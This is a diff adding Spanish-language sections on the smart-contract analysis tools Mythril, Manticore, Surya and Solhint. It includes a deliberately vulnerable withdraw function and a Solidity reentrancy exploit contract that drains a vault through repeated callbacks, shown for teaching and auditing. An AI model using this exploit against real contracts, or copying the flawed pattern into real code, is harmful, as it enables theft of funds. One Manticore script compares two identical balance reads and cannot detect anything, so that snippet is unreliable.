@@ -1037,16 +1037,651 @@ rule onlyOwnerCanWithdraw() {
 - **Falsos negativos:** Timeouts pueden ocultar bugs
 - **Costo económico:** Licencia comercial (gratis para open-source)
 
-## 4.7 Comparativa Integral de Herramientas
+## 4.7 Mythril - Análisis Simbólico con SMT
+
+### 4.7.1 Arquitectura y Funcionamiento
+
+**Mythril** (ConsenSys, 2017) es un analizador simbólico que utiliza SMT (Satisfiability Modulo Theories) solving para detectar vulnerabilidades en smart contracts de manera exhaustiva.
+
+**Características Principales:**
+
+- **Lenguaje:** Python
+- **SMT Solver:** Z3 (Microsoft Research)
+- **Técnica:** Symbolic execution + constraint solving
+- **Detección:** Formal proof de vulnerabilidades
+- **Velocidad:** 30 segundos - 10 minutos (depende de complejidad)
+
+**Pipeline de Análisis:**
+
+```
+┌────────────────────────────────────────────────────────────┐
+│               MYTHRIL ANALYSIS PIPELINE                     │
+├────────────────────────────────────────────────────────────┤
+│                                                             │
+│  1. COMPILATION                                             │
+│     └─> Solidity → EVM bytecode (via solc)                │
+│                                                             │
+│  2. CONTROL FLOW GRAPH (CFG)                                │
+│     ├─> Disassemble bytecode                              │
+│     ├─> Identify basic blocks                             │
+│     └─> Build CFG with JUMP/JUMPI                        │
+│                                                             │
+│  3. SYMBOLIC EXECUTION                                      │
+│     ├─> Execute cada path simbólicamente                  │
+│     ├─> Variables → symbolic values                       │
+│     ├─> Track constraints (path conditions)              │
+│     └─> Bounded exploration (max_depth)                  │
+│                                                             │
+│  4. CONSTRAINT SOLVING (Z3)                                 │
+│     ├─> Para cada path, verificar satisfiability         │
+│     ├─> ¿Existe input que alcanza estado vulnerable?    │
+│     └─> Generar concrete values si SAT                   │
+│                                                             │
+│  5. VULNERABILITY DETECTION                                 │
+│     ├─> SWC-107: Reentrancy                              │
+│     ├─> SWC-101: Integer overflow/underflow              │
+│     ├─> SWC-105: Unprotected ether withdrawal            │
+│     ├─> SWC-106: Unprotected SELFDESTRUCT                │
+│     └─> SWC-104: Unchecked CALL return value             │
+│                                                             │
+└────────────────────────────────────────────────────────────┘
+```
+
+### 4.7.2 Symbolic Execution
+
+**Ejemplo de Análisis:**
+
+```solidity
+// Contrato vulnerable
+function withdraw(uint256 amount) external {
+    require(balances[msg.sender] >= amount);
+    (bool success, ) = msg.sender.call{value: amount}("");
+    require(success);
+    balances[msg.sender] -= amount;  // Vulnerable!
+}
+```
+
+**Exploración Simbólica:**
+
+```python
+# Mythril representa variables simbólicamente
+balances[msg.sender] = α  # Symbolic value
+amount = β
+
+# Path condition para línea 2:
+constraint_1: α >= β
+
+# External call (línea 3):
+call_return = γ  # Symbolic
+
+# Path condition para línea 4:
+constraint_2: γ == true
+
+# State update (línea 5):
+balances[msg.sender] = α - β
+
+# Reentrancy check:
+# ¿Puede call recursivo ejecutar withdraw() nuevamente?
+# Z3 solve: ∃ (α, β, γ) tal que:
+#   - α >= β (primer require)
+#   - α >= 2β (segundo withdraw en reentrancy)
+#   - Ether disponible
+# → SAT! Contraejemplo: α=2, β=1
+```
+
+### 4.7.3 Detectores Implementados
+
+**Detección de Reentrancy:**
+
+```python
+def _execute_reentrancy_check(state, instruction):
+    # Detecta: CALL → SSTORE después de external call
+    if instruction.opcode == "CALL":
+        # Registrar external call
+        state.register_external_call(instruction)
+
+    elif instruction.opcode == "SSTORE":
+        # Verificar si hay external call previo sin state update
+        if state.has_pending_external_call():
+            # Posible reentrancy!
+            constraints = state.get_path_constraints()
+
+            # Verificar con Z3 si es explotable
+            solver = z3.Solver()
+            solver.add(constraints)
+
+            if solver.check() == z3.sat:
+                # Generar contraejemplo
+                model = solver.model()
+                return VulnerabilityReport(
+                    type="REENTRANCY",
+                    swc_id="107",
+                    severity="HIGH",
+                    model=model
+                )
+```
+
+**Detección de Integer Overflow (pre-Solidity 0.8):**
+
+```python
+def _detect_overflow(state, instruction):
+    if instruction.opcode == "ADD":
+        a, b = state.stack.pop(2)
+        result = a + b
+
+        # Verificar overflow: result < a ∨ result < b
+        overflow_condition = z3.Or(
+            z3.ULT(result, a),
+            z3.ULT(result, b)
+        )
+
+        solver = z3.Solver()
+        solver.add(state.constraints)
+        solver.add(overflow_condition)
+
+        if solver.check() == z3.sat:
+            return VulnerabilityReport(
+                type="INTEGER_OVERFLOW",
+                swc_id="101",
+                severity="HIGH"
+            )
+```
+
+### 4.7.4 Uso y Configuración
+
+**Comando Básico:**
+
+```bash
+# Análisis simple
+myth analyze contract.sol
+
+# Con opciones avanzadas
+myth analyze contract.sol \
+    --solv 0.8.20 \
+    --max-depth 128 \
+    --execution-timeout 600 \
+    --parallel-solving \
+    --output json
+```
+
+**Salida JSON:**
+
+```json
+{
+  "success": true,
+  "issues": [
+    {
+      "swc-id": "107",
+      "swc-title": "Reentrancy",
+      "severity": "High",
+      "contract": "VulnerableVault",
+      "function": "withdraw",
+      "address": 142,
+      "description": "External call to user-controlled address before state update",
+      "transaction_sequence": {
+        "steps": [
+          {"from": "0x1000", "to": "contract", "function": "deposit", "value": "1 ether"},
+          {"from": "0x1000", "to": "contract", "function": "withdraw", "value": "0"}
+        ]
+      }
+    }
+  ]
+}
+```
+
+### 4.7.5 Ventajas y Limitaciones
+
+**Ventajas:**
+
+1. **Detección Formal:** Proof matemático de vulnerabilidades
+2. **False Positives Bajos:** ~15-25% (mejor que Slither)
+3. **Contraejemplos Concretos:** Genera inputs que explotan el bug
+4. **Cobertura Exhaustiva:** Explora todos los paths (bounded)
+
+**Limitaciones:**
+
+1. **Path Explosion:** Contratos complejos generan millones de paths
+2. **Timeouts:** Análisis puede tomar >10 minutos y fallar
+3. **Loops:** Requiere unrolling o bounded exploration
+4. **External Contracts:** No analiza dependencias complejas
+5. **False Negatives:** Depth limit puede perder bugs profundos
+
+### 4.7.6 Comparativa Mythril vs Slither
+
+| Aspecto | Mythril | Slither |
+|---------|---------|---------|
+| **Técnica** | Symbolic execution | Static analysis |
+| **Velocidad** | 1-10 minutos | <1 segundo |
+| **Precisión** | 75% (FP: 25%) | 60% (FP: 40%) |
+| **Soundness** | Bounded complete | Overapproximate |
+| **Contraejemplos** | Sí (concrete inputs) | No |
+| **Escalabilidad** | Limitada (path explosion) | Excelente |
+| **Recomendado para** | Contratos críticos | CI/CD, desarrollo |
+
+---
+
+## 4.8 Manticore - Ejecución Simbólica Dinámica
+
+### 4.8.1 Arquitectura
+
+**Manticore** (Trail of Bits, 2017) es un framework de symbolic execution que soporta múltiples plataformas (EVM, x86, ARM).
+
+**Características:**
+
+- **Lenguaje:** Python
+- **Backend:** Unicorn (emulador) + Z3 (solver)
+- **Técnica:** Dynamic symbolic execution (concolic testing)
+- **Generación de Exploits:** Automática
+- **Debugging:** Trace completo de ejecución
+
+**Diferencias con Mythril:**
+
+| Característica | Mythril | Manticore |
+|----------------|---------|-----------|
+| **Enfoque** | Detección rápida | Análisis profundo |
+| **Exploits** | Abstractos | Ejecutables (código) |
+| **Estados** | Explora selectivamente | Explora exhaustivamente |
+| **Workspace** | No | Sí (estados guardados) |
+| **Debugging** | Limitado | Completo (trace + hooks) |
+
+**Flujo de Trabajo:**
+
+```
+┌────────────────────────────────────────────────────────────┐
+│              MANTICORE WORKFLOW                             │
+├────────────────────────────────────────────────────────────┤
+│                                                             │
+│  1. CONTRACT INITIALIZATION                                 │
+│     ├─> Deploy en EVM emulada                             │
+│     └─> Crear initial symbolic state                      │
+│                                                             │
+│  2. SYMBOLIC EXECUTION                                      │
+│     ├─> Ejecutar bytecode paso a paso                     │
+│     ├─> Fork en cada JUMPI (branch)                       │
+│     ├─> Mantener path constraints                         │
+│     └─> Generar nuevos estados (workers)                  │
+│                                                             │
+│  3. STATE EXPLORATION                                       │
+│     ├─> Workers procesan estados en paralelo             │
+│     ├─> Detectar estados "interesantes"                  │
+│     ├─> Prune estados redundantes                        │
+│     └─> Save workspace con todos los estados             │
+│                                                             │
+│  4. VULNERABILITY DETECTION                                 │
+│     ├─> Detectar: CALL con balance > 0 antes de SSTORE   │
+│     ├─> Detectar: Integer overflow conditions            │
+│     ├─> Detectar: Unprotected SELFDESTRUCT               │
+│     └─> Generar finding por cada issue                   │
+│                                                             │
+│  5. EXPLOIT GENERATION                                      │
+│     ├─> Extraer path constraints del estado vulnerable   │
+│     ├─> Solve con Z3 para concrete values                │
+│     ├─> Generar código Solidity del exploit              │
+│     └─> Output: ExploitContract.sol                      │
+│                                                             │
+└────────────────────────────────────────────────────────────┘
+```
+
+### 4.8.2 Uso Básico
+
+**Análisis con Manticore:**
+
+```python
+from manticore.ethereum import ManticoreEVM
+
+# Crear instancia
+m = ManticoreEVM()
+
+# Deploy contract
+with open('VulnerableVault.sol') as f:
+    source_code = f.read()
+
+user_account = m.create_account(balance=10**18)
+contract_account = m.solidity_create_contract(
+    source_code,
+    owner=user_account,
+    contract_name='VulnerableVault'
+)
+
+# Symbolic execution de función withdraw
+symbolic_amount = m.make_symbolic_value()
+m.transaction(
+    caller=user_account,
+    address=contract_account,
+    data=m.make_symbolic_buffer(320),
+    value=0
+)
+
+# Ejecutar exploration
+for state in m.running_states:
+    # Detectar revert
+    if state.platform.is_revert():
+        print(f"Revert en state {state.id}")
+
+    # Detectar balance inconsistency
+    balance_before = state.platform.get_balance(contract_account)
+    balance_after = state.platform.get_balance(contract_account)
+
+    if balance_before != balance_after:
+        print(f"Possible vulnerability in state {state.id}")
+        m.generate_testcase(state, "Vulnerability found")
+```
+
+### 4.8.3 Generación de Exploits
+
+**Output de Manticore:**
+
+```
+mcore_VulnerableVault_0x1234/
+├── test_00000001.tx        # Transacciones que llevan al bug
+├── test_00000001.summary   # Resumen del issue
+├── test_00000001.trace     # Trace de ejecución
+└── test_00000001.constraints  # Path constraints
+
+# test_00000001.tx
+Transaction 1:
+    From: 0x1000
+    To: VulnerableVault
+    Function: deposit()
+    Value: 1000000000000000000 (1 ether)
+
+Transaction 2:
+    From: 0x1000
+    To: VulnerableVault
+    Function: withdraw(uint256)
+    Params: amount=500000000000000000
+    Value: 0
+
+Transaction 3 (reentrancy):
+    From: AttackerContract
+    To: VulnerableVault
+    Function: withdraw(uint256)
+    Params: amount=500000000000000000
+    Value: 0
+```
+
+**Exploit Auto-Generado:**
+
+```solidity
+// Auto-generated by Manticore
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./VulnerableVault.sol";
+
+contract ManticoreExploit {
+    VulnerableVault public target;
+    uint256 public attackCount;
+
+    constructor(address _target) {
+        target = VulnerableVault(_target);
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Need 1 ETH");
+
+        // Step 1: Deposit
+        target.deposit{value: 1 ether}();
+
+        // Step 2: Trigger reentrancy
+        target.withdraw(0.5 ether);
+    }
+
+    receive() external payable {
+        // Reentrancy callback
+        if (address(target).balance >= 0.5 ether && attackCount < 3) {
+            attackCount++;
+            target.withdraw(0.5 ether);
+        }
+    }
+}
+```
+
+### 4.8.4 Hooks y Debugging
+
+**Custom Detectors:**
+
+```python
+from manticore.ethereum import ManticoreEVM, Detector
+
+class ReentrancyDetector(Detector):
+    def will_evm_execute_instruction_callback(self, state, instruction):
+        # Hook antes de cada instrucción
+        if instruction.semantics == 'CALL':
+            # Registrar external call
+            pc = state.platform.current_vm.pc
+            state.context['external_calls'].append(pc)
+
+        elif instruction.semantics == 'SSTORE':
+            # Verificar si hay pending external call
+            if len(state.context.get('external_calls', [])) > 0:
+                # Posible reentrancy!
+                self.add_finding(
+                    state,
+                    pc=state.platform.current_vm.pc,
+                    finding="Potential reentrancy: SSTORE after CALL"
+                )
+
+# Usar detector
+m = ManticoreEVM()
+m.register_detector(ReentrancyDetector())
+```
+
+### 4.8.5 Limitaciones
+
+1. **Performance:** Muy lento (10-30 min para contratos medianos)
+2. **State Explosion:** Genera miles de estados → alto consumo de RAM
+3. **Complejidad:** Requiere experiencia en symbolic execution
+4. **Setup:** Más complejo que Mythril (workspace, hooks)
+
+---
+
+## 4.9 Surya - Visualización y Métricas
+
+### 4.9.1 Propósito y Características
+
+**Surya** (ConsenSys, 2018) es una herramienta de visualización y análisis de código Solidity que genera grafos y métricas de complejidad.
+
+**Características:**
+
+- **Call Graphs:** Visualización de llamadas entre funciones
+- **Inheritance Trees:** Estructura de herencia de contratos
+- **Métricas:** Complejidad ciclomática, SLOC, dependencias
+- **Análisis de Dependencias:** Imports y external calls
+- **Output:** DOT (Graphviz), Markdown, JSON
+
+**Casos de Uso:**
+
+1. **Auditorías Manuales:** Entender arquitectura rápidamente
+2. **Documentación:** Generar diagramas para reports
+3. **Code Review:** Identificar funciones complejas
+4. **Refactoring:** Detectar acoplamiento excesivo
+
+### 4.9.2 Funcionalidades
+
+**1. Call Graph:**
+
+```bash
+surya graph src/contracts/**/*.sol | dot -Tpng > call-graph.png
+```
+
+Ejemplo de output:
+
+```
+VulnerableVault
+  ├─ constructor()
+  ├─ deposit() [PUBLIC] [PAYABLE]
+  ├─ withdraw(uint256) [PUBLIC]
+  │   └─> [EXTERNAL CALL] msg.sender.call
+  ├─ getBalance() [PUBLIC] [VIEW]
+  └─ receive() [EXTERNAL] [PAYABLE]
+      └─> deposit()
+```
+
+**2. Inheritance Tree:**
+
+```bash
+surya inheritance src/ERC20Token.sol
+```
+
+```
+ERC20Token
+  ├─ Ownable
+  │   └─ Context
+  └─ IERC20
+```
+
+**3. Métricas de Complejidad:**
+
+```bash
+surya describe src/**/*.sol
+```
+
+```
+┌──────────────────┬────────────┬─────────┬──────────┬───────────┐
+│ Contract         │ Functions  │ SLOC    │ Complexity│ Interfaces│
+├──────────────────┼────────────┼─────────┼──────────┼───────────┤
+│ VulnerableVault  │ 5          │ 63      │ 12       │ 0         │
+│  ├─ deposit      │ PUBLIC     │ 4       │ 1        │           │
+│  ├─ withdraw     │ PUBLIC     │ 8       │ 3        │           │
+│  ├─ getBalance   │ PUBLIC VIEW│ 2       │ 1        │           │
+│  └─ receive      │ PAYABLE    │ 2       │ 1        │           │
+└──────────────────┴────────────┴─────────┴──────────┴───────────┘
+```
+
+### 4.9.3 Análisis de Dependencias
+
+```bash
+surya dependencies src/Token.sol
+```
+
+Output:
+
+```
+Token.sol
+├─ @openzeppelin/contracts/token/ERC20/ERC20.sol
+│  ├─ @openzeppelin/contracts/token/ERC20/IERC20.sol
+│  └─ @openzeppelin/contracts/utils/Context.sol
+└─ @openzeppelin/contracts/access/Ownable.sol
+   └─ @openzeppelin/contracts/utils/Context.sol
+```
+
+### 4.9.4 Integración en Workflow
+
+```bash
+# Pre-commit hook
+#!/bin/bash
+surya graph src/**/*.sol | dot -Tpng > docs/architecture.png
+surya describe src/**/*.sol > docs/metrics.txt
+
+# Detectar complejidad excesiva
+HIGH_COMPLEXITY=$(surya describe src/**/*.sol | grep "Complexity" | awk '{if ($4 > 15) print $1}')
+
+if [ -n "$HIGH_COMPLEXITY" ]; then
+    echo "Warning: High complexity functions detected"
+    echo "$HIGH_COMPLEXITY"
+fi
+```
+
+---
+
+## 4.10 Solhint - Linting y Best Practices
+
+### 4.10.1 Propósito
+
+**Solhint** es un linter de Solidity que verifica:
+
+- **Security rules:** Vulnerabilidades conocidas
+- **Style guide:** Convenciones de Solidity
+- **Best practices:** Patrones recomendados
+- **Gas optimization:** Ineficiencias de gas
+
+### 4.10.2 Configuración
+
+**.solhintrc:**
+
+```json
+{
+  "extends": "solhint:recommended",
+  "plugins": ["security"],
+  "rules": {
+    "avoid-suicide": "error",
+    "avoid-sha3": "warn",
+    "check-send-result": "error",
+    "reentrancy": "error",
+    "state-visibility": "error",
+    "use-forbidden-name": "error",
+    "avoid-tx-origin": "error",
+    "compiler-version": ["error", "^0.8.0"],
+    "func-name-mixedcase": "warn",
+    "no-empty-blocks": "error",
+    "no-unused-vars": "error",
+    "code-complexity": ["warn", 8],
+    "function-max-lines": ["warn", 50]
+  }
+}
+```
+
+### 4.10.3 Security Rules
+
+```solidity
+// ✗ BAD: avoid-tx-origin
+function transferOwnership(address newOwner) public {
+    require(tx.origin == owner);  // Vulnerable to phishing
+    owner = newOwner;
+}
+
+// ✓ GOOD
+function transferOwnership(address newOwner) public {
+    require(msg.sender == owner);
+    owner = newOwner;
+}
+
+// ✗ BAD: check-send-result
+function withdraw() public {
+    payable(msg.sender).send(amount);  // Ignores return value
+}
+
+// ✓ GOOD
+function withdraw() public {
+    (bool success, ) = payable(msg.sender).call{value: amount}("");
+    require(success, "Transfer failed");
+}
+```
+
+### 4.10.4 Integración CI/CD
+
+```yaml
+# .github/workflows/lint.yml
+name: Solidity Lint
+on: [push, pull_request]
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Install Solhint
+        run: npm install -g solhint
+      - name: Run Solhint
+        run: solhint 'contracts/**/*.sol'
+```
+
+---
+
+## 4.11 Comparativa Integral de Herramientas
 
 | Herramienta | Técnica | Velocidad | Cobertura | Precisión | FP Rate | Expertise | Costo |
 |-------------|---------|-----------|-----------|-----------|---------|-----------|-------|
 | **Slither** | Estático | ★★★★★ <1s | ★★★★★ 100% | ★★★☆☆ 60% | Alto 40% | Bajo | Gratis |
 | **Mythril** | Simbólico | ★★★☆☆ 5m | ★★★★☆ 85% | ★★★★☆ 75% | Medio 25% | Medio | Gratis |
+| **Manticore** | Symb. Din. | ★★☆☆☆ 20m | ★★★★★ 95% | ★★★★★ 90% | Bajo 10% | Alto | Gratis |
 | **Echidna** | Fuzzing | ★★★☆☆ 30m | ★★★☆☆ 60% | ★★★★★ 95% | Bajo 5% | Medio | Gratis |
 | **Medusa** | Fuzzing | ★★★★☆ 5m | ★★★★☆ 80% | ★★★★★ 95% | Bajo 5% | Medio | Gratis |
 | **Foundry** | Testing | ★★★★★ <1m | ★★★★☆ 70% | ★★★★★ 98% | Muy bajo 2% | Bajo | Gratis |
 | **Certora** | Formal | ★☆☆☆☆ 1-2h | ★★★★★ 100% | ★★★★★ 99% | Muy bajo 1% | Alto | Alto |
+| **Surya** | Visualización | ★★★★★ <1s | N/A | N/A | N/A | Bajo | Gratis |
+| **Solhint** | Linting | ★★★★★ <1s | ★★★☆☆ | ★★★★☆ 80% | Medio 20% | Bajo | Gratis |
 
 **Recomendaciones por Fase:**
 
